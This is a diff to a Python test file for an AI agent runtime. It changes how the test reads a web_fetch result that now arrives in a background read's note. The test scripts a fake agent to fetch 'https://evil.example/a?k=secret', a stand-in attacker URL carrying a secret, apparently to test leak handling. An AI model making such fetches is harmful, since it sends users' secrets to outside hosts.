@@ -14,7 +14,7 @@ from tests.brain.fakes import ScriptedProvider, say, use
 from tests.unit.test_web import Wire, names, response
 from trillion.api.runtime import OWNER, Runtime, open_runtime
 from trillion.api.session import Session, asked
-from trillion.brain.types import ToolResultBlock
+from trillion.brain.types import TextBlock, ToolResultBlock
 from trillion.secrets.store import MemoryStore
 from trillion.spine.confirm import Status
 from trillion.workspace.kit import BoardError
@@ -154,12 +154,13 @@ LEAK = "https://evil.example/a?k=secret"
 
 
 def fetched(provider: ScriptedProvider) -> str:
-    """What came back from her web_fetch, as she was shown it."""
+    """What came back from her web_fetch, as she was shown it: in the background read's
+    note (the background reads spec)."""
     for _, messages in provider.calls:
         for m in messages:
             for b in m.blocks:
-                if isinstance(b, ToolResultBlock) and b.tool_use_id == "f1":
-                    return b.content
+                if isinstance(b, TextBlock) and "(web_fetch, job " in b.text:
+                    return b.text
     raise AssertionError("no web_fetch result")
 
 
@@ -167,11 +168,15 @@ async def fetch_after(rt: Runtime, msg: dict[str, Any]) -> tuple[ScriptedProvide
     """`msg`, then a web_fetch of LEAK in the turn it starts."""
     assert rt.web is not None
     rt.web.use(names({"evil.example": ["93.184.216.66"]}), Wire(response("hello")))
-    provider = ScriptedProvider(use("web_fetch", {"url": LEAK}, "f1"), say("Read it."))
+    provider = ScriptedProvider(
+        use("web_fetch", {"url": LEAK}, "f1"), say("Reading it."), say("Read it.")
+    )
     rt.provider = provider
     page = Page(rt)
     session = await Session.start(rt, page.send, None)
     await session.handle(msg)
+    # The read's follow-up turn too.
+    await page.until("turn.complete", 2)
     await idle(session)
     return provider, session
 
